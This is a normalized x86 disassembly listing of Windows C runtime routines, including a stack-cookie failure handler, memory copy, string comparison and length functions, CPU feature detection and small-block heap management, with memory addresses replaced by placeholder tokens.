call sub_41eae3
push esi
call sub_41a87d
push esi
call sub_41c108
push sub_418519
call sub_419d71
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_4185a0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_4185c0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_4185eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_419d69
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_419d69
pop ecx
sub_4186f1
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_418778
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_418778
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_4186f1
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_4188ab
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_41885b
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_41891a
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
xor eax eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] al
mov [ ebp - 0x6 ] al
mov [ ebp - 0x5 ] al
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] al
mov [ ebp - 0x2 ] al
mov [ ebp - 0x1 ] al
cmp [ rw-data ] eax
je r-xdata
mov eax sub_41ee32
push [ rw-data ]
call sub_419dec
pop ecx
jmp r-xdata
add ecx 0xfffffc18
cmp ecx 0xc
ja r-xdata
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx 0xa6
cmp ecx edx
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
jmp [ ecx * 4 + jump_table_418b96 ]
mov [ ebp - 0x28 ] 0x3
mov [ ebp - 0x24 ] r--data
jmp r-xdata
cmp ecx 0x19
jg r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
fld [ edi ]
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x20 ]
push ecx
fld [ ebx ]
fstp [ ebp - 0x18 ]
fld [ esi ]
fstp [ ebp - 0x10 ]
call eax
pop ecx
test eax eax
jne r-xdata
sub ecx 0x1a
je r-xdata
je r-xdata
fld [ edi ]
fstp [ ebp - 0x20 ]
fld [ ebx ]
fstp [ ebp - 0x18 ]
fld [ esi ]
jmp r-xdata
fld [ edi ]
fstp [ esi ]
jmp r-xdata
fld [ edi ]
fmul [ ebp - 0x8 ]
fst [ esi ]
fld [ edi ]
fstp [ ebp - 0x20 ]
fld [ ebx ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x10 ]
call sub_4162ac
mov [ eax ] 0x21
call sub_4162ac
mov [ eax ] 0x22
jmp r-xdata
fld1
jmp r-xdata
dec ecx
je r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov edx ecx
push 0x2
pop ecx
sub edx ecx
je r-xdata
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x28 ] 0x1
call eax
pop ecx
test eax eax
jne r-xdata
fstp [ esi ]
mov [ ebp - 0x28 ] 0x2
jmp r-xdata
dec ecx
je r-xdata
fld [ edi ]
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x20 ]
push ecx
fld [ ebx ]
mov [ ebp - 0x28 ] 0x4
fstp [ ebp - 0x18 ]
fld [ esi ]
fstp [ ebp - 0x10 ]
call eax
pop ecx
jmp r-xdata
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec edx
je r-xdata
mov [ ebp - 0x24 ] r--data
dec ecx
je r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
sub edx 0x5
je r-xdata
mov [ ebp - 0x24 ] r--data
sub ecx 0x1d
je r-xdata
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec edx
je r-xdata
sub ecx 0x3
jne r-xdata
mov [ ebp - 0x24 ] r--data
sub edx 0x5
je r-xdata
mov [ ebp - 0x28 ] 0x3
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec edx
je r-xdata
mov [ ebp - 0x24 ] r--data
sub edx 0x9
jne r-xdata
mov [ ebp - 0x28 ] 0x3
sub_418cb3
push 0xc
push r--data
call sub_415ff4
push 0xe
call sub_419057
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418d1a
call sub_416039
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_415093
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_415093
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_418d30
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_418db8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_4162ac
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_4162ac
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4153b1
add esp 0x14
mov eax esi
jmp r-xdata
sub_418e20
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_418eab
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_418edb
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_41ed13
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_418f26
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_415093
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_418f94
push 0xc
push r--data
call sub_415ff4
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_419cf9
push 0x1e
call sub_419b4e
push 0xff
call sub_4182e7
push 0x18
call sub_41a9de
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_419057
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_4162ac
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_416039
retn
push edi
call sub_415093
pop ecx
push 0xfa0
push edi
call sub_41ed13
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_415093
pop ecx
call sub_4162ac
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41904e
mov eax [ ebp - 0x1c ]
sub_419057
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_418f94
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_418293
pop ecx
sub_41908a
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_4190ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_414a50
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_4193d0
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_419480
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_419588
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
